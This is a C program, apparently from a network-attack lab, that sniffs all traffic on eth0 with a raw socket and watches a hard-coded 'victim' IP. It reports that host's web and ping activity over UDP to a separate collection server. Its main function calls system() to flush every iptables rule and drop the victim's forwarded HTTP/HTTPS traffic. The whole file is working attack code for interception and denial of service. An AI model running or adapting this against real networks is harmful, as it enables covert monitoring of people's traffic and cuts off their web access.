#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <errno.h>

#define MAX_ETHER 1518
#define INTERFACE "eth0"
#define LOCAL_SERVER_HOST "172.20.0.104"
#define LOCAL_SERVER_PORT 9090
#define VICTIM_IP "172.20.0.102"
#define SIZE_ETHERNET 14

// Checksum calculation
uint16_t chksum(unsigned char *buf, size_t buflen) {
    uint32_t sum = 0, i;
    for(i=0; i<buflen-1; i+=2) sum += *(uint16_t*)&buf[i];
    if(buflen & 1) sum += buf[buflen - 1];
    return ~((sum >> 16) + (sum & 0xffff));
}

void send_to_local_server(const char *msg) {
    int sockfd;
    struct sockaddr_in servaddr;
    char recv_buffer[1024];

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket creation failed");
        return;
    }

    // Configure server address
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(LOCAL_SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(LOCAL_SERVER_HOST);

    // Set socket timeout
    struct timeval tv;
    tv.tv_sec = 1;  // 1 second timeout
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // Send message
    printf("\nSending to server: %s\n", msg);
    if (sendto(sockfd, msg, strlen(msg), 0, 
        (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        printf("Failed to send: %s\n", strerror(errno));
        close(sockfd);
        return;
    }

    // Wait for acknowledgment
    socklen_t len = sizeof(servaddr);
    int n = recvfrom(sockfd, recv_buffer, sizeof(recv_buffer)-1, 0,
                     (struct sockaddr *)&servaddr, &len);
    
    if (n > 0) {
        recv_buffer[n] = '\0';
        printf("Received ACK: %s\n", recv_buffer);
    } else {
        printf("No acknowledgment received\n");
    }

    close(sockfd);
}

void process_packet(unsigned char *packet, int size) {
    struct ether_header *eth = (struct ether_header*) packet;
    struct iphdr *iph = (struct iphdr*)(packet + SIZE_ETHERNET);
    struct sockaddr_in source;
    source.sin_addr.s_addr = iph->saddr;
    
    // Only process if from victim
    if (strcmp(inet_ntoa(source.sin_addr), VICTIM_IP) != 0) {
        return;
    }

    int header_size = iph->ihl*4;
    
    // Process based on protocol
    switch(iph->protocol) {
        case IPPROTO_TCP: {
            struct tcphdr *tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + header_size);
            int dest_port = ntohs(tcph->th_dport);
            
            if (dest_port == 80 || dest_port == 443) {
                char message[1024];
                snprintf(message, sizeof(message), "VICTIM_HTTP from %s to port %d",
                        VICTIM_IP, dest_port);
                printf("[+] Intercepted HTTP request from %s\n", VICTIM_IP);
                send_to_local_server(message);
                
                // Drop original packet
                return;
            }
            break;
        }
        case IPPROTO_ICMP: {
            struct icmphdr *icmph = (struct icmphdr*)(packet + SIZE_ETHERNET + header_size);
            if (icmph->type == ICMP_ECHO) {
                char message[1024];
                snprintf(message, sizeof(message), "VICTIM_PING from %s", VICTIM_IP);
                printf("[+] Intercepted PING from %s\n", VICTIM_IP);
                send_to_local_server(message);
            }
            break;
        }
    }
}

int main() {
    int sockfd;
    struct ifreq ifr;
    unsigned char *buffer = malloc(MAX_ETHER);
    
    // Create raw socket
    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Get interface index
    strncpy(ifr.ifr_name, INTERFACE, IFNAMSIZ);
    if(ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX");
        close(sockfd);
        exit(1);
    }

    printf("[+] Sniffer started on %s\n", INTERFACE); 
    printf("[+] Watching victim IP: %s\n", VICTIM_IP);
    printf("[+] Forwarding to: %s:%d\n", LOCAL_SERVER_HOST, LOCAL_SERVER_PORT);

    // Block traffic using iptables
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
            "iptables -F && "
            "iptables -A FORWARD -s %s -p tcp --dport 80 -j DROP && "
            "iptables -A FORWARD -s %s -p tcp --dport 443 -j DROP",
            VICTIM_IP, VICTIM_IP);
    system(cmd);

    while(1) {
        int packet_size = recvfrom(sockfd, buffer, MAX_ETHER, 0, NULL, NULL);
        if(packet_size > 0) {
            process_packet(buffer, packet_size);
        }
    }

    close(sockfd);
    free(buffer);
    return 0;
}